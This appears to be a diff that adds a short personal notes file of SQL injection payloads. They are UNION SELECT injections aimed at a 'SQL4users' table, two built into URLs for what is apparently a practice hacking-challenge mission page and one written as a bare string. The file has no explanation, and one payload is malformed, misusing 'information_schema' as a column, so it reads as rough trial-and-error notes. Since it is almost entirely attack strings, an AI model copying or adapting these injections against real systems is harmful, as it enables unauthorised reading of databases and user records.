@@ -1,0 +1,5 @@
+http://www.enigmagroup.org/missions/basics/sql/4/index.php?id=null%20UNION%20SELECT%201,2,3%20FROM%20`SQL4users`
+
+http://www.enigmagroup.org/missions/basics/sql/4/index.php?id=null%20UNION%20SELECT%201,information_schema,username%20FROM%20`SQL4users`
+
+NULL ); UNION SELECT 1,2,3 FROM `SQL4users`--
